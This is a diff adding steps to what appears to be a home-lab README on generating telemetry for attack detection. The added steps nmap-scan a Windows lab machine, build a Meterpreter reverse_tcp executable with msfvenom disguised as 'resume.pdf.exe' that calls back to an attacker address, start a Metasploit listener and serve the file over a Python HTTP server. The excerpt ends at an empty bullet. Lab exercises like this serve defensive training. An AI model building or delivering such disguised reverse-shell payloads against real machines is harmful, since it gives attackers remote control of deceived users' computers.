@@ -97,3 +97,41 @@
 
 ## STEP 3: HOW TO GENERATE TELEMETRY AND DETECT EVIL :- 
 
+#### Prerequisites :-
+
+![Screenshot 2024-12-21 084318](https://github.com/user-attachments/assets/0334ce6a-6d58-48a1-a424-4ba9da0366ca)
+
+---
+
+### STEPS :-
+
+- #### A. Enable RDP! 
+
+- Open Settings: -> Press Windows + I to open the Settings app. // Go to System > Remote Desktop: -> Toggle on the Enable Remote Desktop option. // Confirm your selection if prompted.
+
+- #### B. Start scanning all portts using nmap :-
+
+- On your kali open terminal -> type command nmap -A 192.168.20.10 -Pn where -Pn skips ping the ip adress is of our victim machine - windows machine and -A enables os detection version detection script scanning and traceroute : will identify any ports that are open
+
+- #### C. Create our own malware :-
+
+ - To get a list of payloads - msfvenom -l payloads
+
+ - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.20.11 lport=4444 -f exe -o resume.pdf.exe
+   [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name being resume.exe ]
+ 
+ - verify with ls
+
+ - ####  D. Open a handler that will listen in on the port we have configured in our malware :-
+
+ - open metasploit by typing msfconsole -> use exploit/multi/handler now we are in the exploit itself
+
+ - type options change the payload to reverse_tcp set payload (paste your payload) and set lhost as your attacker machine press enter check with options
+
+ - start the handler by typing in exploit : we are now listening in and waiting for our test machine to exe our malware
+
+ - #### E. Setup a http server on our kali machine so our test machine can download the malware
+
+ - new tab -> same directory ls -> python3 -m http.server 9999 -> enter [ this will allow our test machine to access our kali machine and start downloading the malware from there ]
+
+ - 
